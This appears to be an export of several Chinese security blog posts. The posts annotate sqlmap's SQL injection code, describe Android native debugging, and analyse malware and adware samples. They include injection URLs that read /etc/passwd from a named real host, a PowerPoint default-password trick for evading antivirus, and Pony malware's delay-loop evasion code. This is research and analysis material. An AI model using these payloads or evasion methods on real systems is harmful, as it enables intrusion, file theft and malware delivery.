C{str} @param position: it is the NULL position where it is possible to inject the query @type position: C{int} @return: UNION ALL SELECT query string forged @rtype: C{str} &quot;&quot;&quot; if query.startswith(&quot;SELECT &quot;): query = query[len(&quot;SELECT &quot;):] inbandQuery = self.prefixQuery(&quot;UNION ALL SELECT &quot;, prefix=prefix) if limited: inbandQuery += &quot;,&quot;.join(map(lambda x: char if x != position else '(SELECT %s)' % query, xrange(0, count))) inbandQuery += FROM_TABLE.get(Backend.getIdentifiedDbms(), &quot;&quot;) inbandQuery = self.suffixQuery(inbandQuery, comment, suffix) return inbandQuery topNumRegex = re.search(&quot;\\ATOP\\s+([\\d]+)\\s+&quot;, query, re.I) if topNumRegex: topNum = topNumRegex.group(1) query = query[len(&quot;TOP %s &quot; % topNum):] inbandQuery += &quot;TOP %s &quot; % topNum intoRegExp = re.search(&quot;(\\s+INTO (DUMP|OUT)FILE\\s+\\'(.+?)\\')&quot;, query, re.I) if intoRegExp: intoRegExp = intoRegExp.group(1) query = query[:query.index(intoRegExp)] if Backend.getIdentifiedDbms() in FROM_TABLE and inbandQuery.endswith(FROM_TABLE[Backend.getIdentifiedDbms()]): inbandQuery = inbandQuery[:-len(FROM_TABLE[Backend.getIdentifiedDbms()])] for element in xrange(0, count): if element &gt; 0: inbandQuery += &quot;, &quot; if element == position: if &quot; FROM &quot; in query and (&quot;(CASE &quot; not in query or (&quot;(CASE &quot; in query and &quot;WHEN use&quot; in query)) and &quot;EXISTS(&quot; not in query and not query.startswith(&quot;SELECT &quot;): conditionIndex = query.index(&quot; FROM &quot;) inbandQuery += query[:conditionIndex] else: inbandQuery += query else: inbandQuery += char if &quot; FROM &quot; in query and (&quot;(CASE &quot; not in query or (&quot;(CASE &quot; in query and &quot;WHEN use&quot; in query)) and &quot;EXISTS(&quot; not in query and not query.startswith(&quot;SELECT &quot;): conditionIndex = query.index(&quot; FROM &quot;) inbandQuery += query[conditionIndex:] if Backend.getIdentifiedDbms() in FROM_TABLE: if &quot; FROM &quot; not in inbandQuery or &quot;(CASE &quot; in inbandQuery or &quot;(IIF&quot; in inbandQuery: inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()] if intoRegExp: inbandQuery += intoRegExp if multipleUnions: inbandQuery += &quot; UNION ALL SELECT &quot; for element in xrange(count): if element &gt; 0: inbandQuery += &quot;, &quot; if element == position: inbandQuery += multipleUnions else: inbandQuery += char if Backend.getIdentifiedDbms() in FROM_TABLE: inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()] inbandQuery = self.suffixQuery(inbandQuery, comment, suffix) return inbandQuerydef __findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL): &quot;&quot;&quot; Finds number of columns affected by UNION based injection &quot;&quot;&quot; retVal = None pushValue(kb.errorIsNone) items, ratios = [], [] kb.errorIsNone = False lowerCount, upperCount = conf.uColsStart, conf.uColsStop if abs(upperCount - lowerCount) &lt; MIN_UNION_RESPONSES: # MIN_UNION_RESPONSES = 5 upperCount = lowerCount + MIN_UNION_RESPONSES min_, max_ = MAX_RATIO, MIN_RATIO # MAX_RATIO = 1.0, MIN_RATIO = 0.0 for count in range(lowerCount, upperCount+1): query = agent.forgeInbandQuery('', -1, count, comment, prefix, suffix, conf.uChar) payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where) page, _ = Request.queryPage(payload, place=place, content=True, raise404=False) ratio = comparison(page, True) or MIN_RATIO ratios.append(ratio) min_, max_ = min(min_, ratio), max(max_, ratio) items.append((count, ratio)) ratios.pop(ratios.index(min_)) # pop the min ratios.pop(ratios.index(max_)) # pop the max deviation = stdev(ratios) # 计算标准偏差 if abs(max_ - min_) &lt; MIN_STATISTICAL_RANGE: # MIN_STATISTICAL_RANGE = 0.01 return None # UNION_STDEV_COEFF = 7 lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation minItem, maxItem = None, None for item in items: if item[1] == min_: minItem = item elif item[1] == max_: maxItem = item if min_ &lt; lower: retVal = minItem[0] if max_ &gt; upper: if retVal is None or abs(max_ - upper) &gt; abs(min_ - lower): retVal = maxItem[0] kb.errorIsNone = popValue() if retVal: infoMsg = &quot;target url appears to be UNION injectable with %d columns&quot; % retVal logger.info(infoMsg) return retVal (3) 根据不同的数据库加上必要的from 表名(4) 再次验证 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061def __unionPosition(comment, place, parameter, value, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL): validPayload = None vector = None positions = range(0, count) # Unbiased approach for searching appropriate usable column # list 中元素乱序 random.shuffle(positions) # For each column of the table (# of NULL) perform a request using # the UNION ALL SELECT statement to test it the target url is # affected by an exploitable inband SQL injection vulnerability # 查找可以显示的列 for position in positions: # Prepare expression with delimiters randQuery = randomStr(UNION_MIN_RESPONSE_CHARS) #UNION_MIN_RESPONSE_CHARS = 10 # 构造随机字符串做标记 phrase = &quot;%s%s%s&quot;.lower() % (kb.misc.start, randQuery, kb.misc.stop) randQueryProcessed = agent.concatQuery(&quot;\\'%s\\'&quot; % randQuery) import logging logging.debug('randQueryProcessed: %s' % randQueryProcessed) randQueryUnescaped = unescaper.unescape(randQueryProcessed) # Forge the inband SQL injection request # 构造UNION ALL SELECT 查询 query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar) payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where) # Perform the request page, headers = Request.queryPage(payload, place=place, content=True, raise404=False) # 移除反射的内容 content = &quot;%s%s&quot;.lower() % (removeReflectiveValues(page, payload) or &quot;&quot;, \\ removeReflectiveValues(listToStrValue(headers.headers if headers else None), \\ payload, True) or &quot;&quot;) if content and phrase in content: validPayload = payload vector = (position, count, comment, prefix, suffix, conf.uChar, where) if where == PAYLOAD.WHERE.ORIGINAL: # Prepare expression with delimiters randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS) # UNION_MIN_RESPONSE_CHARS = 10 phrase2 = &quot;%s%s%s&quot;.lower() % (kb.misc.start, randQuery2, kb.misc.stop) randQueryProcessed2 = agent.concatQuery(&quot;\\'%s\\'&quot; % randQuery2) randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2) # Confirm that it is a full inband SQL injection query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2) payload = agent.payload(place=place, parameter=parameter, newValue=query, where=PAYLOAD.WHERE.NEGATIVE) # Perform the request page, headers = Request.queryPage(payload, place=place, content=True, raise404=False) content = &quot;%s%s&quot;.lower() % (page or &quot;&quot;, listToStrValue(headers.headers if headers else None) or &quot;&quot;) if content and ((phrase in content and phrase2 not in content) or (phrase not in content and phrase2 in content)): vector = (position, count, comment, prefix, suffix, conf.uChar, PAYLOAD.WHERE.NEGATIVE) break return validPayload, vector 1http://ipv6.tsinghua.edu.cn/end.php?ID=-3255%20UNION%20ALL%20SELECT%20NULL,%20CONCAT%28CHAR%2858,107,113,117,58%29,IFNULL%28CAST%28LOAD_FILE%28CHAR%2847,101,116,99,47,104,111,115,116,115%29%29%20AS%20CHAR%29,CHAR%2832%29%29,CHAR%2858,101,114,112,58%29%29,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL# 1http://ipv6.tsinghua.edu.cn/end.php?ID=-8675%20UNION%20ALL%20SELECT%20NULL,%20CONCAT%28CHAR%2858,108,100,107,58%29,IFNULL%28CAST%28LOAD_FILE%28CHAR%2847,101,116,99,47,112,97,115,115,119,100%29%29%20AS%20CHAR%29,CHAR%2832%29%29,CHAR%2858,111,121,105,58%29%29,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL# 基于响应时间, time-based blind and stacked queries SQL injections判断是否delay，在 lib/core/common.py 中wasLastRequestDelayed 实现根据统计结果，sqlmap 注释 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859def wasLastRequestDelayed(): &quot;&quot;&quot; Returns True if the last web request resulted in a time-delay &quot;&quot;&quot; # 99.9999999997440% of all non time-based sql injection affected # response times should be inside +-7*stdev([normal response times]) # Math reference: http://www.answers.com/topic/standard-deviation deviation = stdev(kb.responseTimes) # 计算所有响应时间的标准偏差 threadData = getCurrentThreadData() if deviation: # 需要一定数据量，统计结果才有意义 # MIN_TIME_RESPONSES = 10 if len(kb.responseTimes) &lt; MIN_TIME_RESPONSES: warnMsg = &quot;time-based standard deviation method used on a model &quot; warnMsg += &quot;with less than %d response times&quot; % MIN_TIME_RESPONSES logger.warn(warnMsg) # TIME_STDEV_COEFF = 10 必须大于等于7 lowerStdLimit = average(kb.responseTimes) + TIME_STDEV_COEFF * deviation retVal = (threadData.lastQueryDuration &gt;= lowerStdLimit) # 如果retVal 为True， 发生Delay，需要调整 # TIME_DEFAULT_DELAY = 5, kb.testMode sql injection test mode, # 用户没用手动更改Delay 时间 if not kb.testMode and retVal and conf.timeSec == TIME_DEFAULT_DELAY: adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit) return retVal else: return (threadData.lastQueryDuration - conf.timeSec) &gt;= 0# length of queue for candidates for time delay adjustmentTIME_DELAY_CANDIDATES = 3kb.delayCandidates = TIME_DELAY_CANDIDATES * [0]kb.delayCandidates = [0, 0, 0]def adjustTimeDelay(lastQueryDuration, lowerStdLimit): &quot;&quot;&quot; Adjusts time delay in time-based data retrieval &quot;&quot;&quot; candidate = 1 + int(round((1 - (lastQueryDuration - lowerStdLimit) / lastQueryDuration) * conf.timeSec)) if candidate: kb.delayCandidates = [candidate] + kb.delayCandidates[:-1] if all([x == candidate for x in kb.delayCandidates]) and candidate &lt; conf.timeSec: print warnMsg = &quot;adjusting time delay to %d second%s &quot; % (candidate, 's' if candidate &gt; 1 else '') warnMsg += &quot;(due to good response times)&quot; logger.warn(warnMsg) conf.timeSec = candidate","link":"/cn/sqlmap_sql_injection/"},{"title":"在虚拟机中调试android 手机的方法","text":"由于Google的源码是在ubuntu下编译的，Google官方提供了较为详细的编译说明，所以使用 了ubuntu 14.04 进行编译，编译完成后有一个问题，如何进行源码调试。（源代码在虚拟机中） 使用 virutalbox Extension Pack首先的想法是直接使用中virutalBox 的USB 把手机给连到guest，折腾了一下比较麻烦， 首先需要安装virutalbox 的 Extension Pack，下载地址 http://download.virtualbox.org/virtualbox/5.1.18/Oracle_VM_VirtualBox_Extension_Pack-5.1.18-114002.vbox-extpack 管理-&gt;全局设定-&gt;扩展，选择下载的扩展包，安装。接下来这步很关键，上次就是这里没有搞定。 1sudo usermod -a -G vboxusers &lt;username&gt; 执行命令后需要注销，重新登录。 VirtualBox 虚拟机设置 -&gt; usb 添加需要接入 guest 的 usb 设备。 12345&gt; lsudo lsusb Bus 001 Device 002: ID 18d1:4ee7 Google Inc.Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hubBus 002 Device 002: ID 80ee:0021 VirtualBox USB TabletBus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub 使用端口映射后面想到adb 其实是通过tcp 和Android设备通讯， 所以只要做端口映射打个通道，就可以解决在virutalBox的虚拟机里调试手机的问题。 1tcp 0 0 127.0.0.1:5037 0.0.0.0:* LISTEN 26706/adb 在guest里执行下面两条命令 12autossh -nNL1234:localhost:1234 10.0.2.2 autossh -nNL5037:localhost:5037 10.0.2.2 其中 10.0.2.2 是host的ip，5037 是adb 默认监听的端口，1234 是gdbserver 监听的端 口，利用ssh在host和guest 打个通道。 在host执行adb forward 命令 1adb forward tcp:1234 tcp:1234 这条命令在host和手机上建立了一条通道。 这样就搞定了adb的连接问题。执行这三行命令后在ubuntu下， adb devices 可以看到下面的输出, 问题得到解决。 1234&gt; adb devices List of devices attached 01b00af93dc59e163 device gdbclient system_server :1234 4475 输出正常，可以开始调试了。","link":"/cn/android_emulator_debug/"},{"title":"PowerPoint 彩蛋和加密","text":"PowerPoint的彩蛋PowerPoint的彩蛋是一个很复杂的密码 /01Hannes Ruescher/01 发现这个密码是在 binvul的论坛里面，在网上搜索了一下有几个链接提到了这个密码。 http://social.msdn.microsoft.com/Forums/en-US/4194b097-c5ca-416a-b9d6-7a65ff7d9d43http://msdn.microsoft.com/en-us/library/dd923811(v=office.12).aspx 第二个链接里面有一段关键的内容， 1234If the user has not supplied an encryption password and the document is encrypted, the default encryption choice using the techniques specified in section 2.3 MUST be the following password: &quot;\\x2f\\x30\\x31\\x48\\x61\\x6e\\x6e\\x65\\x73\\x20\\x52\\x75\\x65\\x73\\x63\\x68\\x65\\x72\\x2f\\x30\\x31&quot;. 这里section 2.3 指的是[MS-PPT]中的section 2.3，我们可以发现这个彩蛋其实就是一个类似默认密码的东西。下面来说说这个密码的神奇之处。 彩蛋的利用主要可以用来过杀软，因为性能原因目前很多杀软都不做PPT文档解密。而用户打开却不需要输入密码，非常巧妙。我在binvul上看到一个利用这个技术的样本。 参考资料[MS-PPT].pdf[MS-OFFCRYPTO].pdf","link":"/cn/PowerPoint_egg/"},{"title":"非root Android 设备用gdbserver进行native 调试的方法","text":"没有root的设备，要使用gdbserver 调试app 会遇到权限问题。(emulator 没有问题) 1231|shell@mako:/data/local/tmp $ ./gdbserver :1234 --attach 16907Cannot attach to lwp 16907: Operation not permitted (1)Exiting Android 系统提供了一个run-as 命令来暂时切换用户，但是这个命令有限制，必须是app 打开了debuggable才行，否则会报 Package xx is not debuggable 的错误。从 http://android.googlesource.com/platform/system/core.git/+/master/run-as/run-as.c 的注释来看，主要的作用有两个： 可以查看自己开发的应用的数据 可以使用gdb_server 进行native 的debug 我们的需求是第2个，我们希望可以使用gdb_server 来调试 app 123456shell@mako:/ $ run-asUsage: run-as []shell@mako:/ $ shell@mako:/ $ run-as system_server /data/tmp/gdbserver --attach 596 :1234run-as: Package 'system_server' is unknown 翻看源码，发现有下面 代码： 12345678/* reject system packages */if (userAppId &lt; AID_APP) { panic(&quot;Package '%s' is not an application\\n&quot;, pkgname);}/* reject any non-debuggable package */if (!info.isDebuggable) { panic(&quot;Package '%s' is not debuggable\\n&quot;, pkgname);} 限制比较严格，调试系统app估计是没什么戏，root了应该就没有问题了。但是调试一般的app 还是没有问题的，用apktool 将 AndroidManifest.xml 的 debuggable 设置为true，重新 打包就可以进行native 的 debug 了。下面以CVE-2014-7911的POC为例： 12345678910111213141516171819202122&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.heen.CVE_2014_7911&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:debuggable=&quot;true&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot; &gt; &lt;activity android:name=&quot;.MainActivity&quot; android:label=&quot;@string/app_name&quot; &gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 这个app 正好 android:debuggable=”true” 不用修改了，在模拟器上安装这个app。搭建 gdb调试环境, 分下面几个步骤走： (1) 创建几个目录 123mkdir ~/Androidmkidr ~/Android/system_libmkidr ~/Android/vendor_lib (2) 将Android 设置上的lib下载到本地 12345678910111213cd ~/Android/system_lib/adb pull /system/libcd ~/Android/vendor_lib/adb pull /vendor/libcd ~/Android# 在64位系统 /system/bin/app_process32 和 /system/bin/app_process64adb pull /system/bin/app_processcd ~/Androidadb pull /system/bin/linker (3) 上传gdbserver 1adb push $NDK_PATH/prebuilt/android-arm/gdbserver/gdbserver /data/local/tmp/gdbserver 环境基本搭建好了，测试一下 run-as 命令 12345&gt; adb shell ps...u0_a86 16907 174 900568 38564 ffffffff 00000000 S com.heen.CVE_2014_7911... 12&gt; adb shell run-as com.heen.CVE_2014_7911 iduid=10086(u0_a86) gid=10086(u0_a86) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:untrusted_app:s 已经切换过来了，uid 变了，挂上gdbserver 1234&gt; adb shell run-as com.heen.CVE_2014_7911 /data/local/tmp/gdbserver :123 --attach 16907Can't open socket: Permission denied.Exiting 报了另外一个错误，还是不行，google 一翻发现有debug-pipe 参数，尝试了一下 123&gt; adb shell run-as com.heen.CVE_2014_7911 /data/local/tmp/gdbserver +debug-pipe --attach 16907Attached; pid = 16907Listening on Unix socket debug-pipe 恩，现在没有报错了,执行一下端口转发。 12adb forward tcp:5039 localfilesystem:/data/data/com.heen.CVE_2014_7911/debug-pipe OK, 已经可以调试了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445&gt; $NDK_PATH/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gdb ~/Android/app_process GNU gdb (GDB) 7.6Copyright (C) 2013 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;--host=x86_64-linux-gnu --target=arm-linux-android&quot;.For bug reporting instructions, please see:...Reading symbols from /home/henices/Android/app_process...(no debugging symbols found)...done.(gdb) target remote :5039Remote debugging using :5039warning: Could not load shared library symbols for 100 libraries, e.g. /system/bin/linker.Use the &quot;info sharedlibrary&quot; command to see the complete listing.Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?warning: Unable to find dynamic linker breakpoint function.GDB will be unable to debug shared library initializersand track explicitly loaded dynamic code.0x4013a73c in ?? ()(gdb) info procprocess 16907cmdline = 'com.heen.CVE_2014_7911'cwd = '/'exe = '/system/bin/app_process'(gdb) set solib-search-path ~/Android:~/Android/system_lib/:~/Android/vendor_lib/(gdb) info sharedlibrary0x400f3a60 0x400fe79c Yes (*) /home/henices/Android/linker0x40126070 0x401566ec Yes (*) /home/henices/Android/system_lib/libc.so0x40174828 0x401749c8 Yes (*) /home/henices/Android/system_lib/libstdc++.so0x401798f0 0x4018c478 Yes (*) /home/henices/Android/system_lib/libm.so0x40114f50 0x40116490 Yes (*) /home/henices/Android/system_lib/liblog.so0x4010c38c 0x40110988 Yes (*) /home/henices/Android/system_lib/libcutils.so0x401acb1c 0x401af20c Yes (*) /home/henices/Android/system_lib/libgccdemangle.so0x401a81d0 0x401a94ac Yes (*) /home/henices/Android/system_lib/libcorkscrew.so0x4019b780 0x401a1f24 Yes (*) /home/henices/Android/system_lib/libutils.so0x401cbc50 0x401d5ba4 Yes (*) /home/henices/Android/system_lib/libbinder.so0x402955f0 0x4029585c Yes (*) /home/henices/Android/system_lib/libhardware.so0x402925d0 0x40292834 Yes (*) /home/henices/Android/system_lib/libmemtrack.so0x402bbbf0 0x402cb80c Yes (*) /home/henices/Android/system_lib/libz.so0x402a4240 0x402b23fc Yes (*) /home/henices/Android/system_lib/libandroidfw.so0x402d6774 0x402e53a0 Yes (*) /home/henices/Android/system_lib/libexpat.so0x403083a8 0x4031e684 Yes (*) /home/henices/Android/system_lib/libstlport.so","link":"/cn/non_root_android_native_debug/"},{"title":"通过延迟执行的方法来逃逸杀软","text":"pony 2.01234567891011121314151617181920212223242526272829303132333435363738; KAV heuristic fuckerKAVHeurKiller proc uses esi LOCAL counter: DWORD AntiDisasmTrick push eax mov ecx, ecx pop eax mov ecx, ecx push eax sub esi, esi pop eax mov ecx, ecx push 19131011 mov ecx, ecx pop counter mov edx, eax .WHILE counter mov edx, eax mov ecx, ecx add eax, esi mov edx, eax mov ecx, ecx push eax mov ecx, ecx mov edx, eax invoke GetTickCount mov ecx, ecx pop eax mov edx, eax mov ecx, ecx add eax, edx mov ecx, ecx mov edx, eax dec counter .ENDW retKAVHeurKiller endp pony 1.9123456789.WHILE TRUE invoke GetTickCount mov ecx, 10 xor edx, edx div ecx .IF edx == 5 .BREAK .ENDIF.ENDW","link":"/cn/malware_time_delay_escape/"},{"title":"DZSM apk 样本分析","text":"概况 MD5: 14792786094250715197540fd3b58439 SHA256: 456caeaaa8346c7a9e2198af5a0ca49d87e616a2603884580df22728a49893d7 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Certificate: Data: Version: 3 (0x2) Serial Number: 1208868505 (0x480dde99) Signature Algorithm: sha256WithRSAEncryption Issuer: C=CN, ST=sc, L=sc, O=maizi, OU=maizi, CN=pktool Validity Not Before: Sep 9 09:11:13 2015 GMT Not After : Jan 25 09:11:13 2043 GMT Subject: C=CN, ST=sc, L=sc, O=maizi, OU=maizi, CN=pktool Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (2048 bit) Modulus: 00:93:57:2d:52:af:c1:71:cf:7a:cb:2f:6a:6c:0a: b2:3f:4b:60:a6:a7:d0:9d:ba:36:a1:0f:0d:cc:9e: 32:ea:23:df:80:a3:b3:9f:2b:93:b9:53:c4:e5:bf: 05:32:21:23:c1:13:78:b0:72:08:19:8e:5e:c0:a0: 13:11:19:d6:23:8a:b6:44:2b:73:e0:1d:f3:b3:f4: ab:6c:2e:af:78:2f:8b:e2:dc:b0:d6:06:af:8e:3f: 29:54:1a:59:44:55:73:98:2f:fd:8b:18:b0:de:c6: 9c:ee:0c:c7:f7:04:9d:0c:a7:62:06:45:4f:08:20: 2e:ca:a9:20:88:0e:08:2b:f1:9c:a9:24:5d:35:85: 02:bb:c0:ff:37:98:4b:c7:6f:f2:75:81:43:78:f8: 4b:cc:63:8c:f5:0e:c9:95:05:3d:ee:a1:85:cd:94: 97:b8:48:93:02:b3:71:6e:fb:39:6f:63:5d:a7:24: c1:dc:77:a9:9c:de:5d:76:63:a8:ad:1d:e9:d6:84: 9b:ee:8d:37:38:4b:7c:ff:94:c9:df:dd:17:80:8c: e8:d1:94:5d:05:dc:ef:d8:dc:90:4c:8b:75:22:6d: 57:6e:ee:4c:5f:62:96:5c:72:64:a4:5b:0f:29:e0: f3:31:11:99:6a:b4:e5:6c:16:4d:8a:44:46:06:8f: 06:05 Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Subject Key Identifier: A6:8F:86:BB:A7:0A:DB:29:2E:E9:26:A6:F1:8C:BF:2F:4B:58:99:39 Signature Algorithm: sha256WithRSAEncryption 82:62:98:a8:39:10:3b:f5:09:42:97:de:e9:4c:57:6c:4e:58: a3:1a:31:29:a4:79:98:3f:c9:68:3c:e5:90:be:7f:b0:98:2b: 8f:95:9e:4e:d2:bc:82:6e:bf:32:56:35:87:c8:19:08:ae:af: 9c:db:94:71:d4:db:73:d9:25:e2:e5:f1:92:a0:a4:c4:bd:27: 21:b2:c8:ec:e2:2a:c3:bb:a2:85:97:78:2b:4a:94:cc:fc:dc: 75:6a:11:c8:ba:da:30:be:11:e9:e7:4a:5e:e1:ae:af:4d:36: 14:69:31:ab:68:16:69:ed:a8:bb:c7:be:bf:8b:ca:4c:01:d0: 7e:65:45:31:72:0f:7b:8d:7e:76:40:86:45:8d:ee:a3:b2:ee: ac:d3:0e:60:29:b0:fd:dc:8c:6a:25:06:01:99:81:96:f5:4c: 1d:1a:1d:dc:0e:4b:66:15:80:e8:f5:1c:cd:98:60:71:08:de: f9:4f:69:b0:22:ec:05:18:6b:cd:5a:05:ce:3a:fe:57:4b:e7: 8b:64:b4:f7:4a:cd:63:c1:03:01:e2:b0:aa:81:2d:89:e1:4d: da:fb:8f:b9:37:02:ad:85:64:de:87:73:1a:7a:36:50:3f:e6: 9a:73:65:a0:33:af:81:c6:c8:55:89:e6:a8:03:6a:c6:da:f0: a5:cc:1c:6e 样本通过apktool重打包激情浏览器，引诱下载达到感染的目的。样本安装后启动两个服务常驻手机， 通过广告来获得经济收益,安装应用后访问以下链接： http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.pnghttp://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpghttp://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.pnghttp://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpghttp://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.pnghttp://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg http://dw.cnscns.com 是一个移动广告平台。 分析关键的地方是两个service和一个Receiver 12345678910111213141516&lt;service android:name=&quot;net.tend.dot.DZS&quot; /&gt;&lt;service android:exported=&quot;true&quot; android:name=&quot;net.tend.dot.DZK&quot; android:process=&quot;:daemon&quot; /&gt;&lt;activity android:configChanges=&quot;keyboard|keyboardHidden|orientation|screenSize&quot; android:excludeFromRecents=&quot;true&quot; android:launchMode=&quot;singleInstance&quot; android:name=&quot;net.tend.dot.DZA&quot; android:theme=&quot;@android:style/Theme.Translucent.NoTitleBar&quot; /&gt;&lt;receiver android:name=&quot;net.tend.dot.DZR&quot;&gt;&lt;intent-filter&gt; &lt;action android:name=&quot;android.net.conn.CONNECTIVITY_CHANGE&quot; /&gt; &lt;action android:name=&quot;android.intent.action.USER_PRESENT&quot; /&gt; &lt;action android:name=&quot;com.dz.downloadmanager&quot; /&gt; &lt;action android:name=&quot;action.dz.start&quot; /&gt;&lt;/intent-filter&gt;&lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.PACKAGE_ADDED&quot; /&gt; &lt;action android:name=&quot;android.intent.action.PACKAGE_REMOVED&quot; /&gt; &lt;data android:scheme=&quot;package&quot; /&gt;&lt;/intent-filter&gt;&lt;/receiver&gt; 但是这两个Service和Receiver的代码并不在App代码中，而是在动态加载的dex中，其中的对于关系如下： net.tend.dot.DZS -&gt; mkit.dz.vol.MFSSnet.tend.dot.DZK -&gt; mkit.dz.vol.MFKSnet.tend.dot.DZR -&gt; mkit.dz.vol.MFBRnet.tent.dot.DZA -&gt; mkit.dz.vol.MFAC 而动态加载的dex 由 assets/dzsm 解密而来。样本的文件转换图如下： assets/dzsm 使用DES加密，文件的前32个字节为key，后面的为加密的内容，可以使用下面的java代码进行 解密。解密出来的文件为dex文件，可以用jeb正常分析。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import javax.crypto.Cipher;import javax.crypto.CipherInputStream;import javax.crypto.CipherOutputStream;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;public class decrypt { public static void main(String[] args) { try { String key = &quot;8q6e81ssaiem1msqii9ixasmumsxxxqq&quot;; FileInputStream fis2 = new FileInputStream(&quot;/tmp/dzsm&quot;); FileOutputStream fos2 = new FileOutputStream(&quot;decrypted&quot;); decrypt(key, fis2, fos2); } catch (Throwable e) { e.printStackTrace(); } } public static void encrypt(String key, InputStream is, OutputStream os) throws Throwable { encryptOrDecrypt(key, Cipher.ENCRYPT_MODE, is, os); } public static void decrypt(String key, InputStream is, OutputStream os) throws Throwable { encryptOrDecrypt(key, Cipher.DECRYPT_MODE, is, os); } public static void encryptOrDecrypt(String key, int mode, InputStream is, OutputStream os) throws Throwable { DESKeySpec dks = new DESKeySpec(key.getBytes()); SecretKeyFactory skf = SecretKeyFactory.getInstance(&quot;DES&quot;); SecretKey desKey = skf.generateSecret(dks); Cipher cipher = Cipher.getInstance(&quot;DES&quot;); if (mode == Cipher.ENCRYPT_MODE) { cipher.init(Cipher.ENCRYPT_MODE, desKey); CipherInputStream cis = new CipherInputStream(is, cipher); doCopy(cis, os); } else if (mode == Cipher.DECRYPT_MODE) { cipher.init(Cipher.DECRYPT_MODE, desKey); CipherOutputStream cos = new CipherOutputStream(os, cipher); doCopy(is, cos); } } public static void doCopy(InputStream is, OutputStream os) throws IOException { byte[] bytes = new byte[64]; int numBytes; while ((numBytes = is.read(bytes)) != -1) { os.write(bytes, 0, numBytes); } os.flush(); os.close(); is.close(); }} MainActivity是 com.dz.browser.WelActivity 12345678&lt;activity android:icon=&quot;@drawable/icon1&quot; android:label=&quot;@string/main_name&quot; android:name=&quot;com.dz.browser.WelActivity&quot; android:screenOrientation=&quot;portrait&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt;&lt;/activity&gt; WelActivity 里干几件事： 隐藏图标 123456private void setComponentEnabled(Context context, Class arg6, boolean enabled) { ComponentName v0 = new ComponentName(context, arg6.getName()); PackageManager v3 = context.getPackageManager(); int v1 = enabled ? 1 : 2; v3.setComponentEnabledSetting(v0, v1, 1);} 动态加载dex 12345678910private void GoMain() { new Handler().postDelayed(new Runnable() { public void run() { WelActivity.this.setComponentEnabled(WelActivity.this, WelActivity.class, false); } }, 5000); Intent v0 = new Intent(); v0.setClass(((Context)this), GuideActivity.class); this.startActivity(v0);} GuideActivity 的 onCreate 调用 DZM.getInstance(((Context)this)).init(); 加载 dex。 GuideActivity 同时向广告服务器发送本机信息 1234567891011new Thread(new Runnable() { public void run() { try { Log.i(&quot;ads&quot;, &quot;==&quot; + HttpUtils.post(String.valueOf(Constant.reportUrl) + Utils.getQID( GuideActivity.this), GuideActivity.this.Params.reqparams())); } catch(PackageManager$NameNotFoundException v1) { v1.printStackTrace(); } }}).start(); http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1 12345678POST /api-mobvista/sdkback?appkey=SexTubeMobvista1 